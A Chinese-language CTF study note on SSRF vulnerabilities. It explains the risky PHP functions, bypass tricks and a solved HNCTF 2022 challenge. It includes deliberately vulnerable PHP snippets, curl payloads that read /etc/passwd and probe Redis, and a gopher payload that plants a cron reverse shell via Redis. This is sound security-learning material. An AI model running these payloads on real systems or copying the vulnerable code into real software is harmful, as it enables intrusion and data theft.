---
title: ssrf
date: 2024-11-07 19:31:44
categories: CTF
tags: web
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---

# 介绍
SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。  
[SSRF漏洞（原理、挖掘点、漏洞利用、修复建议](https://www.cnblogs.com/miruier/p/13907150.html)  
[Gopher协议在SSRF漏洞中的深入研究](https://zhuanlan.zhihu.com/p/112055947)

# 具体内容
## 主要攻击方式
- 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息
- 攻击运行在内网或本地的应用程序
- 对内网Web应用进行指纹识别，识别企业内部的资产信息
- 攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)
- 利用file协议读取本地文件等
> http://payloads.net/ssrf.php?url=192.168.1.10:3306  
> http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini

## 产生的相关函数
```php
file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()
```

### 函数解释
1. file_get_contents()
```php
<?php
$url = $_GET['url'];;
echo file_get_contents($url);
?>
```
从指定的url获取内容，然后指定到一个文件名进行保存，并展示给用户，file_put_content则是把一个字符串写入文件中

2. fsockopen()
```php
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
```
fsockopen函数实现对用户指定url数据的获取，使用端口建立tcp连接，变量host为主机名，port为端口，errstr表示错误以字符传的信息返回，30为时限

3. curl_exec()
```php
<?php 
if (isset($_POST['url'])){
    $link = $_POST['url'];
    $curlobj = curl_init();// 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项
    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器
    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源

    $filename = './curled/'.rand().'.txt';
    file_put_contents($filename, $result); 
    echo $result;
}
?>
```
curl_exec函数用于执行指定的cURL会话
>1.一般情况下PHP不会开启fopen的gopher wrapper  
2.file_get_contents的gopher协议不能URL编码  
3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败  
4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用  
5.curl_exec() //默认不跟踪跳转，  
6.file_get_contents() // file_get_contents支持php://input协议

## 利用方式
1. 使用file协议 file protocol (任意文件读取)
>curl -vvv "http://target/ssrf.php?url=file:///etc/passwd"
2. 使用dict协议 dict protocol (获取Redis配置信息)
>curl -vvv "http://target/ssrf.php?url=dict://127.0.0.1:6379/info"
3. 使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)
>curl -vvv "http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d %0aset %0d %0a $1%0d %0a1 %0d %0a $64%0d %0a %0d %0a %0a %0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 %0a %0a %0a %0a %0a %0d %0a %0d %0a %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $3%0d %0adir %0d %0a $16%0d %0a/var/spool/cron/ %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $10%0d %0adbfilename %0d %0a $4%0d %0aroot %0d %0a*1 %0d %0a $4%0d %0asave %0d %0aquit %0d %0a"

## SSRF漏洞绕过方法
-常用的绕过方法
　1.@　　　　　　　　　　http://abc.com@127.0.0.1

　　2.添加端口号　　　　　　http://127.0.0.1:8080

　　3.短地址　　　　　　　　https://0x9.me/cuGfD         
推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/

　　4.可以指向任意ip的域名　 xip.io                             
原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1

　　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制） 

　　6.非HTTP协议

　　7.DNS Rebinding

　　8.利用[::]绕过                 http://[::]:80/ >>> http://127.0.0.1

　　9.句号绕过                  127。0。0。1 >>> 127.0.0.1

　　10.利用302跳转绕过     使用https://tinyurl.com生成302跳转地址


# 例题
## [HNCTF 2022 WEEK2]ez_ssrf
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];
$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```
扫描本地文件发现有flag.php，尝试读取，发现🥰localhost plz🥰，要从本地读取，利用fsockopen的协议构造payload，创建来自本地的请求,有一个坑点就是data的数据构造是利用php来生成的base64加密，不然会出现问题
>  ?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=
```php
<?php
$out = "GET /flag.php HTTP/1.1\r\n";
$out .= "Host: 127.0.0.1\r\n";
$out .= "Connection: Close\r\n\r\n";
echo $out;
echo base64_encode($out);
?>
```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Close
R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=

